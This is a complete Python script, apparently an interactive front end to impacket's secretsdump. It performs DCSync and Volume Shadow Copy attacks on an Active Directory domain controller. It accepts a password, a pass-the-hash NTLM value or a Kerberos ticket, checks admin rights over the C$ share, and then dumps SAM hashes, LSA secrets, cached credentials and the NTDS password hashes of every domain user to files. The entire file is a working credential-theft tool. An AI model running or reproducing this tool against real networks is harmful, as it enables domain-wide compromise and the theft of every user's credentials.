#!/usr/bin/env python3
import os
import sys
import re
import platform
import logging
import traceback
from datetime import datetime

from impacket.smbconnection import SMBConnection
from impacket.ldap.ldap import LDAPConnection, LDAPSessionError
from impacket.examples.secretsdump import (
    LocalOperations, RemoteOperations, SAMHashes,
    LSASecrets, NTDSHashes
)

from ldap3 import Server, Connection, ALL, NTLM
from ldap3.core.exceptions import LDAPBindError
from colorama import Fore, Style, init
import signal

def _exit_handler(sig, frame):
    print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
    sys.exit(0)

signal.signal(signal.SIGINT, _exit_handler)
init(autoreset=True)
logging.getLogger().setLevel(logging.ERROR)


def banner():
    print(Fore.CYAN + """
    ╔═══════════════════════════════════════════╗
    ║            DCSync / SecretsDump           ║
    ║     Dump AD Hashes via DRSUAPI / VSS      ║
    ╚═══════════════════════════════════════════╝
    """)


def validate_ip(ip):
    pattern = r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'
    if not re.match(pattern, ip):
        return False
    return all(0 <= int(p) <= 255 for p in ip.split('.'))


def validate_domain(domain):
    pattern = r'^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$'
    if not re.match(pattern, domain):
        return False
    for part in domain.split('.'):
        if part.startswith('-') or part.endswith('-') or not part:
            return False
    return True


def validate_ntlm_hash(hash_str):
    """Validate NTLM hash format: LM:NT or just NT (32 hex chars)"""
    hash_str = hash_str.strip()
    if ':' in hash_str:
        parts = hash_str.split(':')
        if len(parts) == 2:
            lm, nt = parts
            if (len(lm) == 32 or lm == '') and len(nt) == 32:
                return all(c in '0123456789abcdefABCDEF' for c in lm + nt)
    else:
        if len(hash_str) == 32:
            return all(c in '0123456789abcdefABCDEF' for c in hash_str)
    return False


def validate_ticket_file(file_path):
    """Validate ticket file exists and is readable"""
    full_path = resolve_file_path(file_path)
    if not os.path.exists(full_path):
        return None, f"File not found: {full_path}"
    if os.path.getsize(full_path) == 0:
        return None, f"File is empty: {full_path}"
    if not os.access(full_path, os.R_OK):
        return None, f"Cannot read file: {full_path}"
    return full_path, None


def check_ip_reachable(dc_ip):
    try:
        server = Server(dc_ip, get_info=ALL, connect_timeout=5)
        conn   = Connection(server)
        conn.open()
        conn.unbind()
        return True
    except Exception:
        return False


def check_credentials_password(dc_ip, domain, username, password):
    """Validate credentials using password via LDAP"""
    try:
        base_dn = ','.join([f"DC={part}" for part in domain.split('.')])
        server  = Server(dc_ip, get_info=ALL, connect_timeout=5)
        conn    = Connection(
            server,
            user=f"{domain}\\{username}",
            password=password,
            authentication=NTLM,
            auto_bind=True
        )
        conn.search(
            search_base=base_dn,
            search_filter='(objectClass=domain)',
            search_scope='SUBTREE',
            attributes=['dc']
        )
        result = len(conn.entries) > 0
        conn.unbind()
        return result
    except LDAPBindError:
        return "invalid_credentials"
    except Exception:
        return False


def check_credentials_hash(dc_ip, domain, username, ntlm_hash):
    """Validate credentials using NTLM hash via SMB"""
    try:
        lmhash, nthash = '', ''
        if ':' in ntlm_hash:
            lmhash, nthash = ntlm_hash.split(':')
        else:
            nthash = ntlm_hash
            lmhash = '00000000000000000000000000000000'
        smb = SMBConnection(dc_ip, dc_ip)
        smb.login(username, '', domain, lmhash, nthash)
        tid = smb.connectTree('C$')
        smb.disconnectTree(tid)
        smb.logoff()
        return True
    except Exception as e:
        error = str(e)
        if 'STATUS_LOGON_FAILURE' in error or 'STATUS_ACCESS_DENIED' in error:
            return "invalid_credentials"
        return False


def check_admin_privileges_password(dc_ip, domain, username, password):
    """Check admin privileges using password"""
    try:
        smb = SMBConnection(dc_ip, dc_ip)
        smb.login(username, password, domain, '', '')
        tid = smb.connectTree('C$')
        smb.disconnectTree(tid)
        smb.logoff()
        return True
    except Exception as e:
        error = str(e)
        if 'STATUS_ACCESS_DENIED' in error:
            return "access_denied"
        elif 'STATUS_LOGON_FAILURE' in error:
            return "invalid_credentials"
        return f"error: {error}"


def check_admin_privileges_hash(dc_ip, domain, username, ntlm_hash):
    """Check admin privileges using NTLM hash"""
    try:
        lmhash, nthash = '', ''
        if ':' in ntlm_hash:
            lmhash, nthash = ntlm_hash.split(':')
        else:
            nthash = ntlm_hash
            lmhash = '00000000000000000000000000000000'
        smb = SMBConnection(dc_ip, dc_ip)
        smb.login(username, '', domain, lmhash, nthash)
        tid = smb.connectTree('C$')
        smb.disconnectTree(tid)
        smb.logoff()
        return True
    except Exception as e:
        error = str(e)
        if 'STATUS_ACCESS_DENIED' in error:
            return "access_denied"
        elif 'STATUS_LOGON_FAILURE' in error:
            return "invalid_credentials"
        return f"error: {error}"


def get_input(prompt, validator=None, error_msg=None, allow_empty=False):
    while True:
        try:
            value = input(prompt).strip()
            if not value and not allow_empty:
                print(Fore.RED + "[!] This field cannot be empty!" + Style.RESET_ALL)
                continue
            if validator and value and not validator(value):
                print(Fore.RED + f"[!] {error_msg}" + Style.RESET_ALL)
                continue
            return value
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
            sys.exit(0)


def resolve_file_path(user_input):
    user_input = user_input.lstrip('/').lstrip('\\')
    return os.path.normpath(os.path.join(os.getcwd(), user_input))


def resolve_output_file(user_input):
    if not user_input:
        timestamp = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
        return os.path.join(os.getcwd(), f"dcsync-{timestamp}")
    full_path = resolve_file_path(user_input)
    directory = os.path.dirname(full_path)
    if directory and not os.path.exists(directory):
        try:
            os.makedirs(directory, exist_ok=True)
            print(Fore.YELLOW + f"[*] Created directory: {directory}" + Style.RESET_ALL)
        except PermissionError:
            print(Fore.RED + f"[!] Permission denied: {directory}" + Style.RESET_ALL)
            fallback = os.path.join(os.getcwd(), os.path.basename(user_input))
            print(Fore.YELLOW + f"[*] Saving to: {fallback}" + Style.RESET_ALL)
            return fallback
        except Exception as e:
            print(Fore.RED + f"[!] Cannot create directory: {e}" + Style.RESET_ALL)
            sys.exit(1)
    return full_path


class Options:
    def __init__(self):
        self.use_vss                = False
        self.use_keylist            = False
        self.target_ip              = None
        self.hashes                 = None
        self.aesKey                 = None
        self.rodcKey                = None
        self.rodcNo                 = None
        self.system                 = None
        self.bootkey                = None
        self.security               = None
        self.sam                    = None
        self.ntds                   = None
        self.skip_sam               = False
        self.skip_security          = False
        self.history                = False
        self.outputfile             = None
        self.k                      = False
        self.just_dc                = False
        self.just_dc_ntlm           = False
        self.just_dc_user           = None
        self.ldapfilter             = None
        self.skip_user              = None
        self.pwd_last_set           = False
        self.user_status            = False
        self.resumefile             = None
        self.dc_ip                  = None
        self.exec_method            = 'smbexec'
        self.use_remoteSSMethod     = False
        self.remoteSS_remote_volume = 'C:\\'
        self.remoteSS_local_path    = '.'
        self.ticket_file            = None


class DumpSecrets:
    def __init__(self, remote_name, username='', password='', domain='', options=None, auth_type='password'):
        self.__remoteName       = remote_name
        self.__remoteHost       = options.target_ip
        self.__username         = username
        self.__password         = password
        self.__domain           = domain
        self.__lmhash           = ''
        self.__nthash           = ''
        self.__aesKey           = options.aesKey
        self.__smbConnection    = None
        self.__ldapConnection   = None
        self.__remoteOps        = None
        self.__SAMHashes        = None
        self.__NTDSHashes       = None
        self.__LSASecrets       = None
        self.__useVSSMethod     = options.use_vss
        self.__justDC           = options.just_dc
        self.__justDCNTLM       = options.just_dc_ntlm
        self.__justUser         = options.just_dc_user
        self.__ldapFilter       = options.ldapfilter
        self.__skipUser         = options.skip_user
        self.__skipSam          = options.skip_sam
        self.__skipSecurity     = options.skip_security
        self.__history          = options.history
        self.__pwdLastSet       = options.pwd_last_set
        self.__printUserStatus  = options.user_status
        self.__resumeFileName   = options.resumefile
        self.__outputFileName   = options.outputfile
        self.__doKerberos       = options.k
        self.__kdcHost          = options.dc_ip
        self.__noLMHash         = True
        self.__isRemote         = True
        self.__canProcessSAMLSA = True
        self.__options          = options
        self.__authType         = auth_type

        if options.hashes is not None:
            self.__lmhash, self.__nthash = options.hashes.split(':')

        domain_parts = self.__domain.split('.')
        self.baseDN  = ','.join([f'dc={p}' for p in domain_parts])

    def connect(self):
        """SMB connection with support for Password, Hash, and Kerberos Ticket"""
        # For Kerberos ticket auth:
        # - remoteName = FQDN hostname (for correct SPN: cifs/FQDN@REALM)
        # - remoteHost = IP (for actual TCP connection on port 445)
        # This matches impacket's original secretsdump.py behavior exactly
        if self.__authType == 'ticket':
            print(Fore.YELLOW + "[*] Kerberos SPN: cifs/" + self.__remoteName + "@" + self.__domain.upper() + Style.RESET_ALL)
            print(Fore.YELLOW + "[*] SMB connecting to: " + self.__remoteHost + ":445" + Style.RESET_ALL)

        self.__smbConnection = SMBConnection(self.__remoteName, self.__remoteHost)

        if self.__authType == 'ticket':
            # Kerberos authentication using ticket from KRB5CCNAME
            try:
                print(Fore.YELLOW + "[*] Attempting Kerberos authentication..." + Style.RESET_ALL)

                # impacket will read KRB5CCNAME env var automatically when useCache=True
                self.__smbConnection.kerberosLogin(
                    self.__username, 
                    '',  # empty password - ticket will be used
                    self.__domain,
                    self.__lmhash, 
                    self.__nthash,
                    self.__aesKey,
                    self.__kdcHost,  # KDC IP for port 88 (NOT domain name!)
                    useCache=True  # This tells impacket to use KRB5CCNAME
                )
                print(Fore.GREEN + "[+] Kerberos authentication successful!" + Style.RESET_ALL)
            except Exception as e:
                error_msg = str(e)
                print(Fore.RED + f"[!] Kerberos login failed: {error_msg}" + Style.RESET_ALL)

                # Provide helpful error messages
                if 'KRB5CCNAME' in error_msg or 'ccache' in error_msg.lower():
                    print(Fore.YELLOW + "[*] Tip: Make sure KRB5CCNAME is set correctly." + Style.RESET_ALL)
                elif 'clock skew' in error_msg.lower() or 'time' in error_msg.lower():
                    print(Fore.YELLOW + "[*] Tip: Check system time synchronization with DC." + Style.RESET_ALL)
                elif 'preauth' in error_msg.lower():
                    print(Fore.YELLOW + "[*] Tip: Ticket may be expired or for wrong user." + Style.RESET_ALL)

                print(Fore.RED + "[!] Cannot continue without valid authentication." + Style.RESET_ALL)
                raise  # Re-raise to stop execution
        else:
            # NTLM authentication (password or hash)
            self.__smbConnection.login(
                self.__username, self.__password,
                self.__domain, self.__lmhash, self.__nthash
            )

    def ldap_connect(self):
        target = self.__kdcHost if self.__kdcHost else self.__domain
        try:
            self.__ldapConnection = LDAPConnection(f'ldap://{target}', self.baseDN, self.__kdcHost)
            self.__ldapConnection.login(
                self.__username, self.__password,
                self.__domain, self.__lmhash, self.__nthash
            )
        except LDAPSessionError as e:
            if 'strongerAuthRequired' in str(e):
                self.__ldapConnection = LDAPConnection(f'ldaps://{target}', self.baseDN, self.__kdcHost)
                self.__ldapConnection.login(
                    self.__username, self.__password,
                    self.__domain, self.__lmhash, self.__nthash
                )
            else:
                raise

    def dump(self):
        try:
            self.__isRemote = True
            bootKey         = None

            if self.__ldapFilter:
                try:
                    self.ldap_connect()
                except KeyboardInterrupt:
                    raise
                except Exception as e:
                    print(Fore.RED + f"[-] LDAP connection failed: {e}" + Style.RESET_ALL)

            try:
                self.connect()
                self.__remoteOps = RemoteOperations(
                    self.__smbConnection, self.__doKerberos,
                    self.__kdcHost, self.__ldapConnection
                )
                self.__remoteOps.setExecMethod(self.__options.exec_method)

                if not self.__justDC and not self.__justDCNTLM:
                    self.__remoteOps.enableRegistry()
                    bootKey = self.__remoteOps.getBootKey()
                    self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()

            except KeyboardInterrupt:
                raise
            except Exception as e:
                self.__canProcessSAMLSA = False
                print(Fore.YELLOW + f"[!] RemoteOperations warning: {e}" + Style.RESET_ALL)

            # SAM
            if not self.__justDC and not self.__justDCNTLM and self.__canProcessSAMLSA:
                if not self.__skipSam:
                    try:
                        print(Fore.YELLOW + "[*] Dumping SAM hashes..." + Style.RESET_ALL)
                        sam_file = self.__remoteOps.saveSAM()
                        self.__SAMHashes = SAMHashes(sam_file, bootKey, isRemote=True)
                        self.__SAMHashes.dump()
                        if self.__outputFileName:
                            self.__SAMHashes.export(self.__outputFileName)
                        print(Fore.GREEN + "[+] SAM dump completed!" + Style.RESET_ALL)
                    except KeyboardInterrupt:
                        raise
                    except Exception as e:
                        print(Fore.RED + f"[-] SAM dump failed: {e}" + Style.RESET_ALL)

                if not self.__skipSecurity:
                    try:
                        print(Fore.YELLOW + "[*] Dumping LSA secrets..." + Style.RESET_ALL)
                        sec_file = self.__remoteOps.saveSECURITY()
                        self.__LSASecrets = LSASecrets(
                            sec_file, bootKey, self.__remoteOps,
                            isRemote=True, history=self.__history
                        )
                        self.__LSASecrets.dumpCachedHashes()
                        if self.__outputFileName:
                            self.__LSASecrets.exportCached(self.__outputFileName)
                        self.__LSASecrets.dumpSecrets()
                        if self.__outputFileName:
                            self.__LSASecrets.exportSecrets(self.__outputFileName)
                        print(Fore.GREEN + "[+] LSA dump completed!" + Style.RESET_ALL)
                    except KeyboardInterrupt:
                        raise
                    except Exception as e:
                        print(Fore.RED + f"[-] LSA dump failed: {e}" + Style.RESET_ALL)

            # NTDS
            try:
                print(Fore.YELLOW + "[*] Dumping NTDS (this may take a while)..." + Style.RESET_ALL)
                ntds_file = None

                if self.__useVSSMethod and self.__remoteOps:
                    print(Fore.YELLOW + "[*] Creating Volume Shadow Copy..." + Style.RESET_ALL)
                    try:
                        ntds_file = self.__remoteOps.saveNTDS()
                        if not ntds_file:
                            print(Fore.RED + "[-] VSS failed to create shadow copy, falling back to DRSUAPI..." + Style.RESET_ALL)
                            self.__useVSSMethod = False
                    except KeyboardInterrupt:
                        raise
                    except Exception as e:
                        print(Fore.RED + f"[-] VSS method failed: {e}" + Style.RESET_ALL)
                        print(Fore.YELLOW + "[*] Falling back to DRSUAPI..." + Style.RESET_ALL)
                        self.__useVSSMethod = False

                self.__NTDSHashes = NTDSHashes(
                    ntds_file, bootKey,
                    isRemote=True,
                    history=self.__history,
                    noLMHash=self.__noLMHash,
                    remoteOps=self.__remoteOps,
                    useVSSMethod=self.__useVSSMethod,
                    justNTLM=self.__justDCNTLM,
                    pwdLastSet=self.__pwdLastSet,
                    resumeSession=self.__resumeFileName,
                    outputFileName=self.__outputFileName,
                    justUser=self.__justUser,
                    skipUser=self.__skipUser,
                    ldapFilter=self.__ldapFilter,
                    printUserStatus=self.__printUserStatus
                )
                self.__NTDSHashes.dump()
                print(Fore.GREEN + "[+] NTDS dump completed!" + Style.RESET_ALL)

            except KeyboardInterrupt:
                raise
            except Exception as e:
                print(Fore.RED + f"[-] NTDS dump failed: {e}" + Style.RESET_ALL)

            self.cleanup()

        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
            try:
                self.cleanup()
            except Exception:
                pass
            sys.exit(0)

        except Exception as e:
            print(Fore.RED + f"[-] Dump failed: {e}" + Style.RESET_ALL)
            try:
                self.cleanup()
            except Exception:
                pass

    def cleanup(self):
        if self.__remoteOps:
            self.__remoteOps.finish()
        if self.__SAMHashes:
            self.__SAMHashes.finish()
        if self.__LSASecrets:
            self.__LSASecrets.finish()
        if self.__NTDSHashes:
            self.__NTDSHashes.finish()


if __name__ == '__main__':
    banner()

    dc_ip = get_input(
        Fore.CYAN + "[?] Enter DC IP Address  : " + Style.RESET_ALL,
        validate_ip, "Invalid IP! Example: 192.168.1.1"
    )

    print(Fore.YELLOW + "[*] Checking DC reachability..." + Style.RESET_ALL)
    if not check_ip_reachable(dc_ip):
        print(Fore.RED + f"[!] Cannot reach {dc_ip}!" + Style.RESET_ALL)
        sys.exit(1)
    print(Fore.GREEN + f"[+] DC {dc_ip} is reachable!" + Style.RESET_ALL)

    domain   = get_input(Fore.CYAN + "[?] Enter Domain Name    : " + Style.RESET_ALL,
                         validate_domain, "Invalid domain! Example: cs.org")

    # For Kerberos auth, we need the FQDN hostname (not IP) as remoteName for correct SPN
    fqdn = get_input(
        Fore.CYAN + "[?] Enter DC FQDN/Hostname : " + Style.RESET_ALL +
        Fore.YELLOW + "(e.g. dc.cs.org) " + Style.RESET_ALL,
        allow_empty=True
    )
    if not fqdn:
        # Auto-generate from domain if empty
        fqdn = f"dc.{domain}"
        print(Fore.YELLOW + f"[*] Auto-generated FQDN: {fqdn}" + Style.RESET_ALL)

    username = get_input(Fore.CYAN + "[?] Enter Username       : " + Style.RESET_ALL)

    # Authentication type selection
    print(Fore.CYAN + "\n[?] Authentication type:" + Style.RESET_ALL)
    print(Fore.WHITE + "    1. Password")
    print(Fore.WHITE + "    2. NTLM Hash")
    print(Fore.WHITE + "    3. Kerberos Ticket (ccache)")
    auth_choice = get_input(
        Fore.CYAN + "[?] Choose auth type     : " + Style.RESET_ALL,
        lambda x: x in ['1', '2', '3'],
        "Invalid choice! Enter 1, 2 or 3"
    )

    password   = ''
    ntlm_hash  = None
    ticket_file = None
    auth_type  = 'password'

    if auth_choice == '1':
        password = get_input(Fore.CYAN + "[?] Enter Password       : " + Style.RESET_ALL)
        auth_type = 'password'

        print(Fore.YELLOW + "[*] Verifying credentials and domain..." + Style.RESET_ALL)
        result = check_credentials_password(dc_ip, domain, username, password)
        if result == "invalid_credentials":
            print(Fore.RED + "[!] Invalid credentials!" + Style.RESET_ALL)
            sys.exit(1)
        elif not result:
            print(Fore.RED + f"[!] Domain '{domain}' not found!" + Style.RESET_ALL)
            sys.exit(1)
        print(Fore.GREEN + "[+] Credentials verified!" + Style.RESET_ALL)
        print(Fore.GREEN + f"[+] Domain '{domain}' verified!" + Style.RESET_ALL)

        print(Fore.YELLOW + "[*] Checking admin privileges..." + Style.RESET_ALL)
        priv_result = check_admin_privileges_password(dc_ip, domain, username, password)
        if priv_result == "access_denied":
            print(Fore.RED + f"[!] User '{username}' does not have admin privileges!" + Style.RESET_ALL)
            print(Fore.RED + "[!] DCSync requires Domain Admin or equivalent privileges." + Style.RESET_ALL)
            sys.exit(1)
        elif priv_result == "invalid_credentials":
            print(Fore.RED + "[!] Invalid credentials on SMB!" + Style.RESET_ALL)
            sys.exit(1)
        elif isinstance(priv_result, str) and priv_result.startswith("error"):
            print(Fore.RED + f"[!] Privilege check failed: {priv_result}" + Style.RESET_ALL)
            sys.exit(1)
        print(Fore.GREEN + f"[+] User '{username}' has admin privileges!" + Style.RESET_ALL)

    elif auth_choice == '2':
        ntlm_hash = get_input(
            Fore.CYAN + "[?] Enter NTLM Hash      : " + Style.RESET_ALL +
            Fore.YELLOW + "(LM:NT or just NT) " + Style.RESET_ALL,
            validate_ntlm_hash, "Invalid NTLM hash! Example: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
        )
        auth_type = 'hash'

        # Normalize hash format for impacket (always LM:NT)
        if ':' not in ntlm_hash:
            ntlm_hash = f"00000000000000000000000000000000:{ntlm_hash}"

        print(Fore.YELLOW + "[*] Verifying NTLM hash..." + Style.RESET_ALL)
        result = check_credentials_hash(dc_ip, domain, username, ntlm_hash)
        if result == "invalid_credentials":
            print(Fore.RED + "[!] Invalid hash or user!" + Style.RESET_ALL)
            sys.exit(1)
        elif not result:
            print(Fore.RED + f"[!] Could not verify hash against {dc_ip}!" + Style.RESET_ALL)
            sys.exit(1)
        print(Fore.GREEN + "[+] Hash verified successfully!" + Style.RESET_ALL)

        print(Fore.YELLOW + "[*] Checking admin privileges..." + Style.RESET_ALL)
        priv_result = check_admin_privileges_hash(dc_ip, domain, username, ntlm_hash)
        if priv_result == "access_denied":
            print(Fore.RED + f"[!] User '{username}' does not have admin privileges!" + Style.RESET_ALL)
            print(Fore.RED + "[!] DCSync requires Domain Admin or equivalent privileges." + Style.RESET_ALL)
            sys.exit(1)
        elif priv_result == "invalid_credentials":
            print(Fore.RED + "[!] Invalid credentials on SMB!" + Style.RESET_ALL)
            sys.exit(1)
        elif isinstance(priv_result, str) and priv_result.startswith("error"):
            print(Fore.RED + f"[!] Privilege check failed: {priv_result}" + Style.RESET_ALL)
            sys.exit(1)
        print(Fore.GREEN + f"[+] User '{username}' has admin privileges!" + Style.RESET_ALL)

    else:  # auth_choice == '3'
        while True:
            ticket_input = get_input(
                Fore.CYAN + "[?] Ticket file path     : " + Style.RESET_ALL +
                Fore.YELLOW + "(e.g. ticket.ccache) " + Style.RESET_ALL
            )
            ticket_file, error = validate_ticket_file(ticket_input)
            if ticket_file:
                break
            print(Fore.RED + f"[!] {error}" + Style.RESET_ALL)

        auth_type = 'ticket'
        # Set KRB5CCNAME environment variable for impacket
        os.environ['KRB5CCNAME'] = ticket_file
        print(Fore.GREEN + f"[+] Using ticket: {ticket_file}" + Style.RESET_ALL)
        print(Fore.YELLOW + "[*] Note: Ensure ticket is for a privileged user (Domain Admin)." + Style.RESET_ALL)
        print(Fore.YELLOW + "[*] Skipping credential validation for ticket-based auth." + Style.RESET_ALL)

        # Additional check: verify ticket file is valid ccache format
        try:
            from impacket.krb5.ccache import CCache
            ccache = CCache.loadFile(ticket_file)
            print(Fore.GREEN + f"[+] Ticket loaded successfully!" + Style.RESET_ALL)
            print(Fore.YELLOW + f"[*] Ticket principal: {ccache.principal.toPrincipal()}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"[!] Failed to parse ticket file: {e}" + Style.RESET_ALL)
            print(Fore.YELLOW + "[*] Continuing anyway..." + Style.RESET_ALL)

    print(Fore.CYAN + "\n[?] Dump mode:" + Style.RESET_ALL)
    print(Fore.WHITE + "    1. Everything (SAM + LSA + NTDS)")
    print(Fore.WHITE + "    2. NTDS only (Active Directory hashes)")
    print(Fore.WHITE + "    3. NTDS NTLM only")
    print(Fore.WHITE + "    4. Single user NTDS")
    dump_choice = get_input(
        Fore.CYAN + "[?] Choose mode          : " + Style.RESET_ALL,
        lambda x: x in ['1', '2', '3', '4'],
        "Invalid choice! Enter 1, 2, 3 or 4"
    )

    print(Fore.CYAN + "\n[?] Dump method:" + Style.RESET_ALL)
    print(Fore.WHITE + "    1. DRSUAPI (default - DCSync)")
    print(Fore.WHITE + "    2. VSS (Volume Shadow Copy)")
    method_choice = get_input(
        Fore.CYAN + "[?] Choose method        : " + Style.RESET_ALL +
        Fore.YELLOW + "(default: 1) " + Style.RESET_ALL,
        allow_empty=True
    )

    history_choice = get_input(
        Fore.CYAN + "[?] Dump password history: " + Style.RESET_ALL +
        Fore.YELLOW + "(y/N) " + Style.RESET_ALL,
        allow_empty=True
    )

    timestamp    = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
    default_name = f"dcsync-{timestamp}"
    out_input    = get_input(
        Fore.CYAN   + f"[?] Output filename      : " + Style.RESET_ALL +
        Fore.YELLOW + f"(default: {default_name}) " + Style.RESET_ALL,
        allow_empty=True
    )
    output_file = resolve_output_file(out_input if out_input else "")

    options            = Options()
    options.target_ip  = dc_ip
    options.dc_ip      = dc_ip
    options.outputfile = output_file
    options.use_vss    = (method_choice == '2')
    options.history    = (history_choice.lower() == 'y')
    options.k          = (auth_type == 'ticket')  # Enable Kerberos auth for ticket mode

    if auth_type == 'hash':
        options.hashes = ntlm_hash

    if dump_choice == '2':
        options.just_dc      = True
        options.just_dc_ntlm = False
    elif dump_choice == '3':
        options.just_dc      = True
        options.just_dc_ntlm = True
    elif dump_choice == '4':
        options.just_dc      = True
        target_user          = get_input(Fore.CYAN + "[?] Enter target username: " + Style.RESET_ALL)
        options.just_dc_user = target_user

    print(Fore.YELLOW + f"\n[*] Starting DCSync against {dc_ip}..." + Style.RESET_ALL)
    print(Fore.YELLOW + f"[*] Auth    : {auth_type.upper()}" + Style.RESET_ALL)
    print(Fore.YELLOW + f"[*] Method  : {'VSS' if options.use_vss else 'DRSUAPI (DCSync)'}" + Style.RESET_ALL)
    print(Fore.YELLOW + f"[*] Output  : {output_file}" + Style.RESET_ALL)

    # Use FQDN as remoteName for Kerberos (SPN cifs/FQDN@REALM), IP for NTLM
    remote_name = fqdn if auth_type == 'ticket' else dc_ip
    dumper = DumpSecrets(remote_name, username, password, domain, options, auth_type=auth_type)
    dumper.dump()

    output_dir = os.path.dirname(output_file)
    base_name  = os.path.basename(output_file)
    print(Fore.CYAN + "\n[*] Generated files:" + Style.RESET_ALL)
    for f in os.listdir(output_dir if output_dir else '.'):
        if f.startswith(base_name):
            size = os.path.getsize(os.path.join(output_dir if output_dir else '.', f))
            print(Fore.GREEN + f"    ✔ {f} ({size:,} bytes)" + Style.RESET_ALL)
